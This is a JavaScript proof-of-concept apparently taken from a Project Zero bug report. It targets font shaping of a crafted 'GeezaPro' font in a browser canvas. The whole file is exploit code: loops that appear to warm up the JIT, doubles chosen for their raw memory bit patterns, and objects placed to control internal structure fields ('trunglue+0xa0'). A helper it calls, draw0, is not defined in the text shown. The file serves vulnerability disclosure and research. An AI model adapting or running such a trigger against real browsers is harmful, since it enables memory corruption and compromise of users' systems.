// https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=474948
function pig() {
    var ctx = canvas.getContext('2d');
    ctx.font = '24px GeezaPro';
    ctx.fillText('من ويكيبيديا، الموسوعة الحرة', 400, 200);
}

function setup(a) {
    if (a[0] == 1) setup2(a)
    else return 2
}

function setup2(a) {
    var v1 = a[1]
    var v2 = a[2]
    var v3 = a[3]
    var v4 = a[4]
    var v5 = a[5]
    var v6 = a[6]
    var v7 = a[7]
    var v8 = a[8]
    var v9 = a[9]
    var v10 = a[10]
    var v11 = a[11]
    var v12 = a[12]
    var v13 = a[13]
    var v14 = a[14]
    var v15 = a[15]
    var v16 = a[16]
    var v17 = a[17]
    var v18 = a[18]
    var v19 = a[19]
    var v20 = a[20]
    var v21 = a[10]
    var v22 = a[10]
    var v23 = a[10]
    var v24 = a[10]
    var v25 = a[10]
    var v26 = a[10]
    var v27 = a[10]
    var v28 = a[10]
    if (a[0] == 1) draw0()
    else return 2
    return v1 + v2 + v3 + v4 + v5 + v6 + v7 + v8 + v9 + v10 + v11 + v12 + v13 + v14 + v15 + v16 + v17 + v18 + v19 + v20 +
            v21 + v22 + v23 + v24 + v25 + v26 + v27 + v28
}

function draw() {
    const pocFontFace = new FontFace("GeezaPro", "url(poc.ttf)")

    var canvas = document.getElementById('canvas')
    canvas.setAttribute("style", "font-family: GeezaPro; -webkit-font-smoothing: none;")

    pocFontFace.load().then(function(pocFontFaceLoaded) {
        document.fonts.add(pocFontFaceLoaded)
        document.fonts.ready.then(function() {
            var pro = {
                a: 1,
                b: 2,
                c: 3,
                d: 4,
                e: 5,
                f: 6,
                g: 7,
                h: 8,
                i: 9,
                j: 10,
                k: 11,
                l: 12,
                m: 13,
                n: 14,
                o: 15,
                p: 16,
                q: 17,
                r: 18,
                s: false,   // something that must be small (trunglue+0xa0 - encoded_index)
                t: 20,
                u: {},      // something that must be mapped (trunglue+0xb0 - glyphs)
                v: 22
            }
            var d = 1.8750097740323783401805712856003083288669586181640625; // 0x4000000a3fb26401 in memory
            // can right shift d by multiplying it with e
            var e = 65536*65536*65536*65536*65536*65536*65536*65536*65536*65536*65536*65536*65536*65536*65536*65536;
            setup([1, 1, 2, 3, d*e*e*e, 5, 6, 7, pro, 9, 10, pro, 12, d*65536, 14, 15, 16, 17, 18, 19, 20])
        })
    })
}

for (var i = 0; i < 1500; ++i) setup([0])
for (var i = 0; i < 1500; ++i) setup2([0])

draw()